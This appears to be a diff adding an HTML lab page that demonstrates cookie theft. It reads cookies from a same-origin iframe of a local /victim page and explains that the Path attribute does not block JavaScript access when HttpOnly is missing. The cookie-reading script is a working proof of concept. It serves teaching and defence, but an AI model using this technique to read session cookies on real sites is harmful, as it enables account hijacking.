@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attacker Page - Cookie Theft Demo</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .section { margin: 20px 0; padding: 15px; border: 1px solid #ccc; }
+        .success { background: #d4edda; padding: 10px; }
+        .info { background: #d1ecf1; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Frame Path Cookie Theft Demonstration</h1>
+    
+    <div class="section info">
+        <h2>Attack Overview</h2>
+        <p>This demonstrates how the Path attribute alone doesn't prevent cookie theft when:</p>
+        <ul>
+            <li>Cookies are set without HttpOnly flag</li>
+            <li>Attacker can embed victim content in iframe</li>
+            <li>Same-origin policy allows parent access to iframe</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Step 1: Set Victim Cookie</h2>
+        <!-- This loads your victim cookie setter -->
+        <iframe src="/victim" width="600" height="200"></iframe>
+    </div>
+
+    <div class="section">
+        <h2>Step 2: Embed Victim Page in Iframe</h2>
+        <!-- This loads the SAME /victim page so we can read cookies -->
+        <iframe id="victimFrame" src="/victim" width="600" height="300"></iframe>
+    </div>
+
+    <div class="section">
+        <h2>Step 3: Steal Cookies from Iframe</h2>
+        <button onclick="stealCookies()">Steal Cookies from Iframe</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function stealCookies() {
+            const iframe = document.getElementById('victimFrame');
+            const resultDiv = document.getElementById('result');
+            
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const stolenCookies = iframeDoc.cookie;
+
+                if (stolenCookies) {
+                    resultDiv.innerHTML = `
+                        <div class="success">
+                            <h3>✓ Cookies Successfully Stolen!</h3>
+                            <p><strong>Stolen Cookies:</strong> ${stolenCookies}</p>
+                            <p>This works because:</p>
+                            <ul>
+                                <li>No HttpOnly flag → JavaScript can read cookies</li>
+                                <li>Same Origin → Attacker frame can access victim iframe</li>
+                                <li>Path=/victim-path does NOT prevent JS access</li>
+                            </ul>
+                        </div>`;
+                } else {
+                    resultDiv.innerHTML = `<div class="info"><p>No cookies found.</p></div>`;
+                }
+            } catch (e) {
+                resultDiv.innerHTML = `<div class="info"><p>Error: ${e.message}</p></div>`;
+            }
+        }
+    </script>
+</body>
+</html>
